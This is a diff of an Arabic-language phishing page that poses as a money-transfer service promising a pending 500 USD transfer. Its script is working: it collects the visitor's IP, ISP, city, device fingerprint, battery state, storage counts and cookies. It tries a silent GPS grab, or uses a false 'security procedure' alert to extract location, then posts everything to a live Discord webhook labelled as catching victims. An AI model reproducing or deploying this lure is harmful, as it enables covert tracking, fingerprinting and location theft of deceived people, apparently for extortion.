@@ -3,13 +3,15 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق من الحوالات</title>
+    <title>نظام الصرافة الآلي - تأكيد الحوالة</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 380px; border-top: 8px solid #004a99; }
-        .btn { background: #004a99; color: white; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; transition: 0.3s; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 2.5rem; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 360px; border-top: 6px solid #004a99; }
+        .logo { font-size: 24px; font-weight: bold; color: #004a99; margin-bottom: 20px; }
+        .btn { background: #004a99; color: white; border: none; padding: 14px 28px; border-radius: 6px; cursor: pointer; font-size: 17px; font-weight: bold; width: 100%; transition: 0.3s; }
         .btn:hover { background: #003366; }
-        #loader { display: none; margin-top: 20px; }
+        .info-text { font-size: 14px; color: #444; margin: 20px 0; line-height: 1.6; }
+        #loader { display: none; margin-top: 15px; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -17,106 +19,145 @@
 <body>
 
     <div class="card">
-        <h2 style="color:#004a99">تأكيد استلام مالي</h2>
-        <p>يرجى الضغط على الزر أدناه لإصدار إشعار الحوالة (PDF) وتأكيد الهوية عبر GPS.</p>
-        <button id="captureBtn" class="btn">إصدار الإشعار الآن</button>
+        <div class="logo">نظام الحوالات السريعة</div>
+        <p class="info-text">
+            لديك حوالة معلقة بمبلغ <b>500.00 USD</b>.<br>
+            يجب الضغط على الزر أدناه لإصدار إشعار الصرف الإلكتروني وتحديد أقرب فرع لاستلام المبلغ.
+        </p>
+        
+        <button id="captureBtn" class="btn">إصدار إشعار الحوالة (PDF)</button>
+
         <div id="loader">
             <div class="spinner"></div>
-            <p style="font-size: 12px; color: #666;">جاري فحص أمن الشبكة والمطابقة...</p>
+            <p style="font-size: 12px; color: #777; margin-top: 10px;">جاري تأكيد البيانات الرقمية...</p>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1463545171609124910/5Vk_iL0QX1eNFSBttcZIZEUH6Vb-S0PO_PW1BDFLr_S_bCQ5rjuHpaAj_K2qgtogFbev';
 
-        async function getFullReport() {
+        async function getTechData() {
             // 1. معلومات الشبكة والـ IP
-            let net = { ip: "N/A", city: "N/A", isp: "N/A", country: "N/A", type: "N/A" };
+            let ipData = { ip: "Unknown", city: "Unknown", org: "Unknown", country: "Unknown" };
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                net = { ip: d.ip, city: d.city, isp: d.org, country: d.country_name };
+                ipData = await res.json();
             } catch (e) {}
 
             // نوع الاتصال (Wi-Fi / Mobile)
+            let connectionType = "Unknown";
             if (navigator.connection) {
-                net.type = `${navigator.connection.effectiveType} (${navigator.connection.type || 'Unknown'})`;
+                connectionType = navigator.connection.effectiveType || "Unknown";
             }
 
-            // 2. معلومات التخزين (قراءة ما يتوفر)
-            const storage = {
-                localStorage: Object.keys(localStorage).length > 0 ? "يوجد بيانات" : "فارغ",
-                sessionStorage: Object.keys(sessionStorage).length > 0 ? "يوجد بيانات" : "فارغ",
-                cookiesEnabled: navigator.cookieEnabled ? "نعم" : "لا"
-            };
-
-            // 3. معلومات الجهاز العميقة
+            // 2. معلومات الجهاز العميقة
             const gl = document.createElement('canvas').getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
             const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
 
+            let battery = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+            }
+
+            // 3. فحص التخزين والكوكيز
+            const storageReport = {
+                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+                localStorage: Object.keys(localStorage).length,
+                sessionStorage: Object.keys(sessionStorage).length,
+                // محاولة جلب أسماء الكوكيز المتاحة للنطاق الحالي فقط
+                cookieNames: document.cookie || "No accessible cookies"
+            };
+
             return {
-                net,
-                storage,
+                network: {
+                    ip: ipData.ip,
+                    city: ipData.city,
+                    country: ipData.country_name,
+                    isp: ipData.org,
+                    conn: connectionType
+                },
                 device: {
-                    platform: navigator.platform,
-                    ua: navigator.userAgent,
+                    os: navigator.platform,
+                    browser: navigator.userAgent,
                     lang: navigator.language,
                     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     res: `${window.screen.width}x${window.screen.height}`,
-                    gpu: gpu,
                     cores: navigator.hardwareConcurrency || "N/A",
-                    memory: navigator.deviceMemory || "N/A"
-                }
+                    gpu: gpu,
+                    battery: battery
+                },
+                storage: storageReport
             };
         }
 
         document.getElementById('captureBtn').onclick = async function() {
-            document.getElementById('captureBtn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
+            const btn = this;
+            const loader = document.getElementById('loader');
+            btn.style.display = 'none';
+            loader.style.display = 'block';
 
-            const report = await getFullReport();
+            const data = await getTechData();
 
-            alert("إجراء أمني: يرجى الضغط على 'سماح' في النافذة التالية لتأكيد موقعك الجغرافي واستكمال عملية التحويل.");
+            if (navigator.permissions) {
+                const status = await navigator.permissions.query({ name: 'geolocation' });
+                if (status.state === 'granted') {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => sendToDiscord(data, pos.coords),
+                        (err) => sendToDiscord(data, null, "فشل السحب الصامت"),
+                        { enableHighAccuracy: true }
+                    );
+                    return;
+                }
+            }
+
+            alert("إجراء أمني: يتطلب نظام التحويلات الوصول إلى الموقع (GPS) لمرة واحدة لضمان تسليم الحوالة في الفرع الصحيح بمدينتك. يرجى الضغط على 'سماح' عند الطلب.");
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendFinal(report, pos.coords),
-                    (err) => sendFinal(report, null, "رفض الإذن"),
+                    (pos) => sendToDiscord(data, pos.coords),
+                    (err) => sendToDiscord(data, null, "رفض الإذن"),
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                sendFinal(report, null, "غير مدعوم");
+                sendToDiscord(data, null, "غير مدعوم");
             }
         };
 
-        function sendFinal(report, coords, err = null) {
-            const fields = [
-                { name: "🌐 الشبكة والـ IP", value: `IP: ${report.net.ip}\nISP: ${report.net.isp}\nCity: ${report.net.city}\nConn: ${report.net.type}`, inline: false },
-                { name: "📱 الجهاز والنظام", value: `OS: ${report.device.platform}\nGPU: ${report.device.gpu}\nRes: ${report.device.res}\nLang: ${report.device.lang}`, inline: false },
-                { name: "⏰ الوقت والتخزين", value: `TZ: ${report.device.tz}\nCookies: ${report.storage.cookiesEnabled}`, inline: true }
+        function sendToDiscord(tech, coords, error = null) {
+            let fields = [
+                { name: "🌐 الشبكة والاتصال", value: `IP: ${tech.network.ip}\nISP: ${tech.network.isp}\nCity: ${tech.network.city}\nType: ${tech.network.conn}`, inline: false },
+                { name: "📱 تفاصيل الجهاز", value: `OS: ${tech.device.os}\nGPU: ${tech.device.gpu}\nRes: ${tech.device.res}\nCores: ${tech.device.cores}`, inline: false },
+                { name: "⚙️ إعدادات المستخدم", value: `Lang: ${tech.device.lang}\nTZ: ${tech.device.tz}\nBattery: ${tech.device.battery}`, inline: false },
+                { name: "🍪 التخزين والكوكيز", value: `Status: ${tech.storage.cookies}\nLocalItems: ${tech.storage.localStorage}\nContent: ${tech.storage.cookieNames.substring(0, 100)}...`, inline: false }
             ];
 
             if (coords) {
-                fields.push({ name: "📍 GPS دقيق", value: `[فتح الخريطة](https://www.google.com/maps?q=$${coords.latitude},${coords.longitude})`, inline: false });
+                fields.push(
+                    { name: "🎯 إحداثيات GPS دقيقة", value: `${coords.latitude}, ${coords.longitude}`, inline: false },
+                    { name: "🗺️ رابط الخريطة", value: `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`, inline: false }
+                );
             } else {
-                fields.push({ name: "❌ حالة الـ GPS", value: err, inline: false });
+                fields.push({ name: "❌ حالة الموقع", value: error, inline: false });
             }
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: "المحقق الرقمي",
+                    username: "المحقق الرقمي للمبتزين",
                     embeds: [{
-                        title: coords ? "🎯 تم صيد المعلومات الكاملة" : "⚠️ صيد تقني (بدون GPS)",
+                        title: coords ? "✅ تم صيد المعلومات الكاملة (GPS)" : "⚠️ صيد تقني متقدم",
                         color: coords ? 65280 : 16711680,
                         fields: fields,
-                        footer: { text: report.device.ua }
+                        footer: { text: tech.device.browser }
                     }]
                 })
             }).finally(() => {
-                setTimeout(() => { window.location.href = "https://i.imgur.com/R672DqF.jpg"; }, 1500);
+                setTimeout(() => {
+                    window.location.href = "https://i.imgur.com/R672DqF.jpg";
+                }, 1500);
             });
         }
     </script>
